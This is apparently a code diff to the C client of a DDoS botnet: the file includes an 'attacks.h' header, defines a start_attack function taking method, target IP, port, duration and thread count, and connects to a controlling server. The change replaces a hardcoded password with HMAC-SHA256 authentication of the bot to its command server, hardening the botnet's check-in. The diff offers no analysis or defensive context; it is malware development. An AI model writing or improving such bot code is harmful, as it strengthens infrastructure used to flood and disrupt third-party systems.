@@ -8,6 +8,8 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <signal.h>
+#include <openssl/hmac.h>
+#include <openssl/evp.h>
 #include "attacks.h"
 #include "config.h"
 
@@ -32,6 +34,65 @@ char *get_architecture() {
     }
 
     return arch;
+}
+
+int base64_decode(const char *input, unsigned char *output, int *outlen) {
+    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    int i = 0, j = 0, k = 0;
+    unsigned char temp[4];
+    *outlen = 0;
+
+    while (input[i] != '\0' && input[i] != '=') {
+        const char *pos = strchr(base64_chars, input[i]);
+        if (pos == NULL) {
+            i++;
+            continue;
+        }
+        temp[j++] = pos - base64_chars;
+        
+        if (j == 4) {
+            output[k++] = (temp[0] << 2) | (temp[1] >> 4);
+            output[k++] = ((temp[1] & 0x0F) << 4) | (temp[2] >> 2);
+            output[k++] = ((temp[2] & 0x03) << 6) | temp[3];
+            j = 0;
+            *outlen = k;
+        }
+        i++;
+    }
+    
+    if (j > 0) {
+        if (j >= 2) output[k++] = (temp[0] << 2) | (temp[1] >> 4);
+        if (j >= 3) output[k++] = ((temp[1] & 0x0F) << 4) | (temp[2] >> 2);
+        *outlen = k;
+    }
+    
+    return (*outlen > 0) ? 0 : -1;
+}
+
+void generate_bot_auth(const char *arch, char *auth_output) {
+    unsigned char secret[32];
+    int secret_len = 0;
+    
+    if (strcmp(BOT_SECRET_B64, "CHANGE_THIS_IN_CONFIG_JSON") == 0) {
+        strcpy(auth_output, "");
+        return;
+    }
+    
+    if (base64_decode(BOT_SECRET_B64, secret, &secret_len) != 0 || secret_len != 32) {
+        strcpy(auth_output, "");
+        return;
+    }
+    
+    unsigned char hmac_result[EVP_MAX_MD_SIZE];
+    unsigned int hmac_len;
+    
+    HMAC(EVP_sha256(), secret, 32, (unsigned char *)arch, strlen(arch), 
+         hmac_result, &hmac_len);
+    
+    for (unsigned int i = 0; i < hmac_len; i++) {
+        sprintf(auth_output + (i * 2), "%02x", hmac_result[i]);
+    }
+    auth_output[hmac_len * 2] = '\0';
 }
 
 void start_attack(const char *method, const char *ip, int port, int duration, int thread_count, const char *username) {
@@ -333,9 +394,18 @@ int main() {
             recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
 
             if (recv_size > 0 && strstr(buffer, "Password") != NULL) {
-                unsigned char passwd[] = "\xff\xff\xff\xff\75\n";
-                send(sock, passwd, 6, 0);
-                printf("[INFO] Authenticated successfully\n");
+                char auth_token[65];
+                generate_bot_auth(arch, auth_token);
+                if (strlen(auth_token) > 0) {
+                    send(sock, auth_token, strlen(auth_token), 0);
+                    send(sock, "\n", 1, 0);
+                    printf("[INFO] Authenticated successfully with HMAC\n");
+                } else {
+                    printf("[ERROR] Failed to generate authentication token\n");
+                    close(sock);
+                    sleep(20);
+                    continue;
+                }
             }
         }
 
